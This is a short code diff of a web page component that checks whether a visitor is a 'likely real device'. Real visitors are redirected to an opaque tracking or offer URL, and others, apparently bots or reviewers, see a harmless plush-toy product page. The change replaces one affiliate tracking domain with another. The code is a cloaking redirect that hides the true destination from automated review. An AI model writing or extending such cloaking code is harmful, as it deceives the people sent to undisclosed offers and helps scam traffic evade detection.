@@ -17,7 +17,7 @@ export default function Home() {
       });
       const { isLikelyRealDevice } = await res.json();
       if (isLikelyRealDevice) {
-        window.location.href = "https://glstrck.com/aff_c?offer_id=1224&aff_id=11848";
+        window.location.href = "https://spnccrzone.com/?f5c=CeJbuhcvUQOLdLHqBOZZr6zA2kQcuHifvQJDRoz7h5U%3d&s1=";
       } else {
         window.location.href = "https://milkmochabear.com/products/matcha-plush";
       }
